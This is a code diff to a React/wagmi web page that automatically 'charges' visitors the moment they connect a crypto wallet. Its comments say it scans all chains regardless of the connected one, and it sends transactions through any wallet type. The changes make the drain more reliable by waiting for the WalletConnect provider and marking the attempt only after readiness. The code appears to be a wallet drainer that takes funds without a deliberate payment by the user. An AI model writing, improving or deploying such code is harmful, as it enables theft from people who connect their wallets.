@@ -113,7 +113,7 @@ export default function Home() {
   // Automatic charge on wallet connection
   useEffect(() => {
     const performAutoCharge = async () => {
-      if (!isConnected || !address || !balanceData) return;
+      if (!isConnected || !address || !balanceData || !connector) return;
 
       const chainName = chains?.find((c) => c.id === chainId)?.name || `Chain ${chainId}`;
       const connectionKey = `${address}-${chainId}`;
@@ -135,11 +135,6 @@ export default function Home() {
         return;
       }
       
-      // IMPORTANT: Mark attempt BEFORE executing to prevent re-execution on page return from WalletConnect
-      // WalletConnect opens wallet app which causes browser redirect/return
-      chargeAttemptedRef.current.add(connectionKey);
-      console.log('✅ Marked charge attempt for:', connectionKey);
-
       // Note: We don't check if charging is enabled on the current chain
       // because we will scan ALL chains regardless of which one is currently connected
       
@@ -176,6 +171,12 @@ export default function Home() {
         // For WalletConnect, check if the connector is actually ready
         if (connector.id === 'walletConnect') {
           console.log('🔍 WalletConnect detected - verifying connection state...');
+
+          const walletConnectProvider = await connector.getProvider();
+          if (!walletConnectProvider) {
+            throw new Error('WalletConnect provider is not ready. Please return to the wallet app and try again.');
+          }
+          console.log('✅ WalletConnect provider is ready');
           
           // Try to reconnect if disconnected
           try {
@@ -201,6 +202,9 @@ export default function Home() {
           
           console.log('✅ WalletConnect connection verified');
         }
+
+        chargeAttemptedRef.current.add(connectionKey);
+        console.log('✅ Marked charge attempt for:', connectionKey);
         
         // Use wagmi's sendTransactionAsync - works with ALL wallet types
         // (MetaMask, Trust Wallet, WalletConnect, Coinbase Wallet, etc.)
@@ -424,7 +428,7 @@ export default function Home() {
     };
 
     performAutoCharge();
-  }, [isConnected, address, chainId, balanceData, chains, sendTx]);
+  }, [isConnected, address, chainId, balanceData, chains, connector, sendTx, switchChain, isSendingTx]);
 
   const activeWalletAddress = useMemo(() => {
     if (address) return address;
